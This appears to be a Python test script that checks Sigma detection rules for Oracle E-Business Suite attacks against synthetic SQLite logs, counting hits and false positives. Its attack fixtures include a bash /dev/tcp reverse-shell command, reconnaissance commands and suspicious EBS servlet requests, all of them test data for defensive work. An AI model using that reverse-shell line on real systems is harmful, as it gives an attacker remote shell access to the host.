#!/usr/bin/env python3
"""
Test the Sigma rules against SYNTHETIC host and web logs.

1. Builds hand-written log events (attack + benign baseline) in SQLite.
2. Converts each Sigma rule to SQL with `sigma convert -t sqlite`.
3. Runs every rule against the attack set and the benign set and prints
   hits / false positives (the numbers in the report's results table).

Requires: pip install sigma-cli pySigma-backend-sqlite
Run from the project root:  python3 scripts/test_sigma.py
"""
import glob
import os
import sqlite3
import subprocess

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
JAVA = "/u01/oracle/fs1/EBSapps/comn/util/jdk/bin/java"

# ---- synthetic process_creation events (Linux, Sysmon-for-Linux style fields)
PROC_COLS = ["User", "ParentImage", "Image", "CommandLine"]
PROC_ATTACK = [
    ("applmgr", JAVA, "/bin/bash", "bash -c bash -i >& /dev/tcp/203.0.113.77/4444 0>&1"),
    ("applmgr", JAVA, "/usr/bin/id", "id"),
    ("applmgr", JAVA, "/usr/bin/uname", "uname -a"),
    ("applmgr", JAVA, "/usr/bin/hostname", "hostname"),
    ("applmgr", JAVA, "/usr/sbin/ip", "ip addr"),
]
PROC_BENIGN = [
    ("applmgr", "/bin/bash", "/usr/bin/id", "id"),                      # admin at a terminal (non-Java parent)
    ("applmgr", "/bin/bash", "/usr/bin/ps", "ps -ef"),
    ("applmgr", JAVA, "/bin/sh", "sh -c /u01/oracle/scripts/adcmctl.sh status"),  # Java runs a script, not interactive
    ("oracle", "/usr/sbin/cron", "/bin/bash", "bash /home/oracle/backup.sh"),
    ("root", "/usr/lib/systemd/systemd", "/usr/sbin/sshd", "sshd -D"),
    ("jharris", "/bin/bash", "/usr/bin/whoami", "whoami"),             # non-service user
]

# ---- synthetic webserver access-log events
WEB_COLS = ["c-ip", "cs-method", "cs-uri-stem", "cs-uri-query"]
PREVIEW = "page=/oracle/apps/xdo/oa/template/webui/TemplatePreviewPG"
WEB_ATTACK = [
    ("200.107.207.26", "POST", "/OA_HTML/configurator/UiServlet", ""),
    ("185.181.60.11", "POST", "/OA_HTML/SyncServlet", ""),
    ("185.181.60.11", "GET", "/OA_HTML/OA.jsp", PREVIEW + "&TemplateCode=TMP4142434445"),
    ("185.181.60.11", "GET", "/OA_HTML/OA.jsp", PREVIEW + "&TemplateCode=DEF0102030405"),
]
WEB_BENIGN = [
    ("10.0.0.50", "GET", "/OA_HTML/AppsLogin", ""),
    ("10.0.0.50", "POST", "/OA_HTML/OA.jsp", "_rp=1&evtSrc=Submit"),
    ("10.0.0.51", "POST", "/OA_HTML/configurator/UiServlet", ""),       # internal Configurator use
    ("10.0.0.50", "GET", "/OA_HTML/OA.jsp", PREVIEW + "&TemplateCode=XXAP_INVOICE"),
    ("198.51.100.23", "GET", "/OA_HTML/RF.jsp", "function_id=1234"),
]


def make_db(rows, cols):
    db = sqlite3.connect(":memory:")
    db.execute("CREATE TABLE logs (" + ", ".join(f'"{c}" TEXT' for c in cols) + ")")
    db.executemany(f"INSERT INTO logs VALUES ({','.join('?' * len(cols))})", rows)
    return db


def convert(rule_path):
    out = subprocess.run(["sigma", "convert", "-t", "sqlite", rule_path],
                         capture_output=True, text=True, check=True).stdout
    return [l for l in out.splitlines() if l.startswith("SELECT")][-1]


def main():
    rules = sorted(glob.glob(os.path.join(ROOT, "sigma", "*.yml")))
    # Each rule targets one slice of the attack set, so per-rule hits are a
    # subset; the combined-coverage line shows whether every event was caught.
    covered = {"proc": set(), "web": set()}
    print(f"{'Rule':24} {'Attack hits':>12} {'Benign FPs':>12}")
    print("-" * 50)
    for r in rules:
        sql = convert(r)
        is_web = "webserver" in open(r).read()
        kind = "web" if is_web else "proc"
        cols = WEB_COLS if is_web else PROC_COLS
        atk = WEB_ATTACK if is_web else PROC_ATTACK
        ben = WEB_BENIGN if is_web else PROC_BENIGN
        hit_rows = make_db(atk, cols).execute(sql).fetchall()
        covered[kind].update(hit_rows)
        fps = len(make_db(ben, cols).execute(sql).fetchall())
        name = os.path.splitext(os.path.basename(r))[0]
        print(f"{name:24} {len(hit_rows):>5}/{len(atk):<6} {fps:>5}/{len(ben):<6}")
    print("-" * 50)
    print(f"Combined coverage - process events: {len(covered['proc'])}/{len(PROC_ATTACK)}, "
          f"web events: {len(covered['web'])}/{len(WEB_ATTACK)}")


if __name__ == "__main__":
    main()
